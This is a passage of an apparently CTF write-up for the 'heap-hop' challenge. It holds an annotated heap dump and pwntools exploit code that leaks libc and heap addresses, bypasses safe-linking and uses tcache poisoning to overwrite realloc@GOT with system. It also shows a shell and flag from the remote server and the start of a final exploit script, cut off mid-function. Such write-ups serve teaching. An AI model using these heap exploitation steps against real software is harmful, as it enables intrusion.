class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">0x1d83120       0x0000000000000000      0x0000000000000041      ........A.......        &lt;= chunk used to get the oob r/w</span><br><span class="line">0x1d83130       0x000000000000000a      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83140       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83150       0x0000000000000020      0x0000000000000000       ...............</span><br><span class="line">0x1d83160       0x0000000000000000      0x0000000000000031      ........1.......        &lt;= track buffer of the chunk used to get the oob r/w</span><br><span class="line">0x1d83170       0x0000000000000a5f      0x0000000000000000      _...............                                                                               </span><br><span class="line">0x1d83180       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83190       0x0000000000000000      0x0000000000000041      ........A.......        &lt;= victim chunk, size: 0x400, its track field is fell into the unsortedbin</span><br><span class="line">0x1d831a0       0x000000000000000a      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d831b0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d831c0       0x0000000000000400      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d831d0       0x0000000000000000      0x0000000000000411      ................        &lt;-- unsortedbin[all][0]                                                </span><br><span class="line">0x1d831e0       0x00007f0eb218dce0      0x00007f0eb218dce0      ................                                                                               </span><br><span class="line">0x1d831f0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83200       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83210       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83220       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83230       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83240       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83250       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83260       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83270       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83280       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83290       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d832a0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d832b0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d832c0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d832d0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d832e0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d832f0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83300       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83310       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83320       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83330       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83340       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83350       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83360       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83370       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83380       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83390       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d833a0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d833b0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d833c0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d833d0       0x0000000000000000      0x0000000000000000      ................</span><br><span class="line">0x1d833e0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d833f0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83400       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83410       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83420       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83430       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83440       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83450       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83460       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83470       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83480       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83490       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d834a0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d834b0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d834c0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d834d0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d834e0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d834f0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83500       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83510       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83520       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83530       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83540       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83550       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83560       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83570       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83580       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83590       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d835a0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d835b0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d835c0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d835d0       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d835e0       0x0000000000000410      0x0000000000000040      ........@.......        &lt;= Freed chunk 11</span><br><span class="line">0x1d835f0       0x000000000000000a      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83600       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83610       0x0000000000000200      0x0000000001d83170      ........p1......                                                                               </span><br><span class="line">0x1d83620       0x0000000000000000      0x0000000000000211      ................                                                                               </span><br><span class="line">0x1d83630       0x0000000000001d83      0x5b5e1382ca86a7f8      ..............^[        &lt;-- tcachebins[0x210][0/1]                                             </span><br><span class="line">0x1d83640       0x0000000000000000      0x0000000000000000      ................                                                                               </span><br><span class="line">0x1d83650       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83660       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83670       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83680       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83690       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d836a0       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d836b0       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d836c0       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d836d0       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d836e0       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d836f0       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83700       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83710       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83720       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83730       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83740       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83750       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83760       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83770       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83780       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83790       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d837a0       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d837b0       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d837c0       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d837d0       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d837e0       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d837f0       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83800       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83810       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83820       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83830       0x0000000000000000      0x0000000000000041      ........A.......        &lt;= last small chunk, barreer               </span><br><span class="line">0x1d83840       0x000000000000000a      0x0000000000000000      ................                             </span><br><span class="line">0x1d83850       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d83860       0x0000000000000020      0x0000000001d83880       ........8......                             </span><br><span class="line">0x1d83870       0x0000000000000000      0x0000000000000031      ........1.......                             </span><br><span class="line">0x1d83880       0x00000000000a3233      0x0000000000000000      32..............                             </span><br><span class="line">0x1d83890       0x0000000000000000      0x0000000000000000      ................                             </span><br><span class="line">0x1d838a0       0x0000000000000000      0x000000000001e761      ........a.......        &lt;-- Top chunk        </span><br></pre></td></tr></table></figure>

<p>I advice you to take a look at the heap layout if you do not understand the exploit script.</p>
<h3 id="Heap-leak"><a href="#Heap-leak" class="headerlink" title="Heap leak"></a>Heap leak</h3><p>Now we got a libc leak we’re looking for a heap leak, it is basically the same thing as above, but instead of freeing a large chunk, we free a small <code>0x20</code> sized chunk. To understand the defeat of safe-linking I advice you to read <a target="_blank" rel="noopener" href="https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation">this</a>. Which gives:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heap to craft pointers</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x10</span>, <span class="string">b&quot;osef&quot;</span>) <span class="comment"># split unsortedbin chunk</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># tcache 0x20</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">11</span>) <span class="comment"># oob read</span></span><br><span class="line">io.recv(<span class="number">0x70</span>)</span><br><span class="line">heap = (pwn.unpack(io.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span>) - <span class="number">0x2000</span> <span class="comment"># leak fp of 1</span></span><br><span class="line">pwn.log.info(<span class="string">f&quot;heap: <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>To achieve tcache poisoning we just need to get the <code>0x20</code> sized chunk right after the out of bound chunk. Then we free it and we use the out of bound chunk to overwrite the forward pointer of the victim chunk to <code>&amp;realloc@GOT</code>. Given we leaked the heap we can easily bypass the safe-linking protection.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#== tcache poisoning</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get the 0x20 sized chunk that is right after the oob chunk</span></span><br><span class="line">edit(<span class="number">10</span>, <span class="number">10</span>, <span class="string">b&quot;osef&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache 0x20, count = 2, tcache poisoning is basically 10-&gt;fp = target</span></span><br><span class="line">free(<span class="number">10</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># oob write to set 10-&gt;fp = &amp;realloc@got-8 (due to alignment issues)</span></span><br><span class="line">edit(<span class="number">11</span>, <span class="number">0x20</span>, <span class="string">b&quot;Y&quot;</span> * <span class="number">0x60</span> + pwn.p64(<span class="number">0</span>) + pwn.p64(<span class="number">0x31</span>) + pwn.p64(((heap + <span class="number">0x21f0</span>) &gt;&gt; <span class="number">12</span>) ^ (exe.got.realloc - <span class="number">8</span>))) </span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, <span class="number">10</span>, pwn.p64(libc.address + one_gadget(<span class="string">&quot;./libc.so.6&quot;</span>)[<span class="number">0</span>])) <span class="comment"># useless</span></span><br><span class="line">edit(<span class="number">12</span>, <span class="number">10</span>, <span class="string">b&quot;/bin/sh\0&quot;</span>) <span class="comment"># 12 =&gt; b&quot;/binb/sh\0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># given we falls on &amp;realloc@got-8, we overwrite got entries correctly </span></span><br><span class="line">edit(<span class="number">4</span>, <span class="number">10</span>, pwn.p64(libc.sym.malloc) + pwn.p64(libc.sym.system) + pwn.p64(libc.sym.scanf))</span><br></pre></td></tr></table></figure>

<h2 id="PROFIT"><a href="#PROFIT" class="headerlink" title="PROFIT"></a>PROFIT</h2><p>Then we just have to do:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># edit =&gt; realloc(&quot;/bin/sh&quot;) =&gt; system(&quot;/bin/sh&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">12</span>).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">10</span>).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>Which gives:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">nasm@off:~/Documents/pwn/pwnme/heap$ python3 exploit.py REMOTE HOST=51.254.39.184 PORT=1336</span><br><span class="line">[*] &#x27;/home/nasm/Documents/pwn/pwnme/heap/heap-hop&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3ff000)</span><br><span class="line">    RUNPATH:  b&#x27;/home/nasm/Documents/pwn/pwnme/heap&#x27;</span><br><span class="line">[*] &#x27;/home/nasm/Documents/pwn/pwnme/heap/libc.so.6&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] &#x27;/home/nasm/Documents/pwn/pwnme/heap/ld-linux-x86-64.so.2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 51.254.39.184 on port 1336: Done</span><br><span class="line">[*] libc: 0x7faf9a27f000</span><br><span class="line">[*] heap: 0x191d000</span><br><span class="line">[*] one_gadget: 0x7faf9a36acf8 @ 0x404050</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(player) gid=999(ctf) groups=999(ctf)</span><br><span class="line">$ ls</span><br><span class="line">flag.txt</span><br><span class="line">run</span><br><span class="line">$ cat flag.txt</span><br><span class="line">PWNME&#123;d1d_y0u_kn0w_r341l0c_c4n_b3h4v3_l1k3_th4t&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Final-exploit"><a href="#Final-exploit" class="headerlink" title="Final exploit"></a>Final exploit</h2><p>Here is the final exploit:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this exploit was generated via</span></span><br><span class="line"><span class="comment"># 1) pwntools</span></span><br><span class="line"><span class="comment"># 2) ctfmate</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;heap-hop&quot;</span></span><br><span class="line">LIBC = <span class="string">&quot;/home/nasm/Documents/pwn/pwnme/heap/libc.so.6&quot;</span></span><br><span class="line">LD = <span class="string">&quot;/home/nasm/Documents/pwn/pwnme/heap/ld-linux-x86-64.so.2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = pwn.context.binary = pwn.ELF(BINARY)</span><br><span class="line">libc = pwn.ELF(LIBC)</span><br><span class="line">ld = pwn.ELF(LD)</span><br><span class="line">pwn.context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">pwn.context.delete_corefiles = <span class="literal">True</span></span><br><span class="line">pwn.context.rename_corefiles = <span class="literal">False</span></span><br><span class="line">p64 = pwn.p64</span><br><span class="line">u64 = pwn.u64</span><br><span class="line">p32 = pwn.p32</span><br><span class="line">u32 = pwn.u32</span><br><span class="line">p16 = pwn.p16</span><br><span class="line">u16 = pwn.u16</span><br><span class="line">p8  = pwn.p8</span><br><span class="line">u8  = pwn.u8</span><br><span class="line"></span><br><span class="line">host = pwn.args.HOST <span class="keyword">or</span> <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(pwn.args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        <span class="keyword">return</span> pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pwn.process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span></span><br><span class="line">    io = pwn.connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        pwn.gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">one_gadget</span>(<span class="params">filename</span>):</span><br><span class="line">  <span class="keyword">return</span> [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> subprocess.check_output([<span class="string">&#x27;one_gadget&#x27;</span>, <span class="string">&#x27;--raw&#x27;</span>, filename]).decode().split(<span class="string">&#x27; &#x27;</span>)]</span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source ~/Downloads/pwndbg/gdbinit.py</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    io = start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, name, trackLen, trackContent</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, name)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(trackLen).encode())</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(trackLen).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">idx</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;[+] track content :\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, newLength, trackContent</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(newLength).encode())</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, trackContent)</span><br><span class="line"></span><br><span class="line">   